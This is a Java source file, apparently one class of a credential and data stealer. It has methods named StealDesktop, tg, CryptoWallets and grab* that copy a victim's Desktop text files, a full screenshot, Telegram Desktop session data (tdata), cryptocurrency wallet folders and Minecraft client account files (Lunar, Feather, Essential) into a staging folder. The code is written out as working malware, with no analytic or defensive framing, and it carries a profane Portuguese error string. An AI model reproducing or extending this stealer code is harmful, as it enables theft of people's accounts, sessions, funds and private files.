package org.example;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Paths;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.Random;

import javax.imageio.ImageIO;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

public class zero {
   public static void StealDesktop() {
      try {
         (new File(back.xdFolderPath + "\\desktop")).mkdirs();
         if (Files.isDirectory(Paths.get(System.getProperty("user.home") + "\\Desktop"), new LinkOption[0])) {
            File[] var0 = (File[])((File[])Objects.requireNonNull(Paths.get(System.getProperty("user.home") + "\\Desktop").toFile().listFiles()));
            int var1 = var0.length;

            for(int var2 = 0; var2 < var1; ++var2) {
               File file = var0[var2];
               if (file.isFile() && file.getName().endsWith(".txt")) {
                  utils.copyFile(new File(System.getProperty("user.home") + "\\Desktop\\" + file.getName()), new File(back.xdFolderPath + "\\desktop\\" + file.getName()));
               }
            }
         }
      } catch (Exception var4) { var4.printStackTrace(); }
   }

   public static void ScreenshotScreen(){
      try {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        (new Random()).nextInt();
        ImageIO.write(image, "png", new File(back.xdFolderPath + "\\screenshot.png"));
      } catch (Exception var4){ utils.errorMessage(var4, "Sem capitura de tela????????????? vai se fuderrrr, como isso e possivel??? ( apenas reporta essa merda )"); }
   }

   public static void tg(){
      try {
         String td = back.appData + File.separator + "Telegram Desktop";
         String tdata = td + File.separator + "tdata";
         File directory = new File(tdata);
         File targetDirectory = new File(back.xdFolderPath + "\\tdata");
         boolean exists = utils.doesDirectoryExist(td);
         if(exists){
            if(!targetDirectory.exists()){
               targetDirectory.mkdir();
            }
            List<File> matchingFiles = utils.getMatchingFiles(directory);
            Iterator<File> var6 = matchingFiles.iterator();
            
            while (var6.hasNext()) {
               File file = (File)var6.next();

               try {
                  utils.copyFileToDirectory(file, targetDirectory); } catch (Exception var11) {}
            }
            List<File> matchingDirectories = utils.getMatchingDirectories(directory);
            Iterator<File> var14 = matchingDirectories.iterator();

            while(var14.hasNext()){
               File directorys = (File)var14.next();
               try {
                  utils.copyDirectoryToDirectory(directorys, targetDirectory);
               } catch (Exception var10) { }
            }
         }
      } catch (Exception var12) { }
   }

   public static void CryptoWallets(){
      try {
         (new File(back.xdFolderPath + "\\wallets")).mkdir();
         String[] var0 = back.Wallets;
         int var1 = var0.length;

         for(int var2 = 0; var2 < var1; var2++){
            String Wallet = var0[var2];
            if(Files.isDirectory(Paths.get(Wallet), new LinkOption[0])){
               utils.copyDirectory(new File(Wallet), new File(back.xdFolderPath + "\\wallets\\" + Wallet.split("\\\\")[5]));
            }
         }
      } catch (Exception var4) { }
   }

   public static void grabLunar(){
      if(back.lunarPath.exists()){
         File target = new File(back.xdFolderPath + "\\lunar\\Lunar.json");
         utils.copyFile(back.lunarPath, target);
      }
   }

   public static void grabFeather(){
      if(back.featherPath.exists()){
         File target = new File(back.xdFolderPath + "\\feather\\Feather.json");
         utils.copyFile(back.featherPath, target);
      }
   }

   public static void grabEssentials(){
      if(back.essentialsPath.exists()){
         File target = new File(back.xdFolderPath + "\\essentials\\Essential.json");
         utils.copyFile(back.essentialsPath, target);
      }
   }
}